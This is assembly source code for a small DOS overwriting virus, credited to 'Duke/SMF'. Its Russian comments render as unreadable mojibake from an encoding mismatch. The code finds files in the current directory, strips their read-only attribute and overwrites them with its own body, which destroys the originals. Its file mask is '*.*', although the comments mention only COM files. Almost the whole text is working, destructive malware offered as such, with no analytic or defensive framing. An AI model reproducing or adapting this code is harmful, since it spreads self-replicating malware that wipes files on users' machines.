   ; Trivial.60 (c) by Duke/SMF
   ; Greetz to Kouch & Nowhere Man [NuKE]
   ; *®à ¦ ¥â ¢á¥ COM-ä ©«ë (¢ â®¬ ç¨«¥ R/O) ¢ â¥ªãé¥© ¤¨à¥ªâ®à¨¨.

                   model   tiny
                   .code
                   org     100h
   virus_length    equ     finish - start      ;„«¨  ¢¨àãá 
                   ; §  áç¥â â®£®, çâ® ¤«¨  ¢¨àãá  ¢ëç¨á«ï¥âáï
                   ; ¨¬¥® ¢ íâ®¬ ¬¥áâ¥, ¢ë¨£àë¢ ¥¬ 2 ¡ ©â  !

   start  :                                    ;* ç «® ¢¨àãá 
                   mov     ah,04Eh             ;*®¨áª ¯¥à¢®£® ä ©« 
                   mov     dx,offset file_spec ;DX ãª §ë¢ ¥â   "*.com"
   infect:
                   int     21h
                   jnc     infect_file         ;…á«¨ ä ©«  ©¤¥, â® ¯®à ¦ ¥¬,
                   ret                         ;¢ ¯à®â¨¢®¬ á«ãç ¥ ª®¥æ à ¡®âë.
   infect_file:
                   mov     ah,43H              ;*â¨ ª®¬ ¤ë ¡¥àãâ ä ©«®¢ë¥
                   mov     al,0                ; âà¨¡ãâë ¨ ¬¥ïîâ ¨å  
                   mov     dx,09Eh             ;¤®áâã¯ ª çâ¥¨î/§ ¯¨á¨, ¨
                   int     21H                 ;ª®£¤  ¯à¨¤¥â ¢à¥¬ï ®âªàë¢ âì ä ©«
                                               ;
                   mov     ah,43H              ;¢¨àãá á¬®¦¥â ¯®à §¨âì ä ©«
                   mov     al,1                ;á  âà¨¡ãâ®¬ 'read only'.
                   mov     dx,09Eh             ;” ©« ®áâ ¢«ï¥âáï ¤®áâã¯ë¬
                   mov     cl,0                ;¤«ï çâ¥¨ï/§ ¯¨á¨, ¯®áª®«ìªã
                   int     21H                 ;íâ® ¨ªâ® ¥ ¯à®¢¥àï¥â.

                   mov     ax,03D01h           ;Žâªàë¢ ¥¬ ä ©« ¤«ï § ¯¨á¨
                   mov     dx,09Eh             ;DX ãª §ë¢ ¥â    ©¤¥ë© ä ©«
                   int     021h

                   xchg    bx,ax               ;BX á®¤¥à¦¨â ä ©«®¢ë© handle

                   mov     ah,040h             ;”ãªæ¨ï § ¯¨á¨ ¢ ä ©«
                   mov     cl,virus_length     ;CL = áª®«ìª® ¡ ©â ¯¨á âì
                   mov     dx,offset start     ;DX =  ç «® ª®¤  ¢¨àãá 
                   int     021h

                   mov     ah,03Eh             ;‡ ªàë¢ ¥¬ ä ©«
                   int     021h

                   mov     ah,04Fh             ;*®¨áª á«¥¤ãîé¥£® ä ©« 
                   jmp     infect              ;*¥à¥å®¤   § à ¦¥¨¥

   file_spec       db      "*.*",0             ;Œ áª  ä ©«®¢ ¤«ï ¯®¨áª 

   finish  :                                   ;Š®¥æ ¢¨àãá 
                   end     start
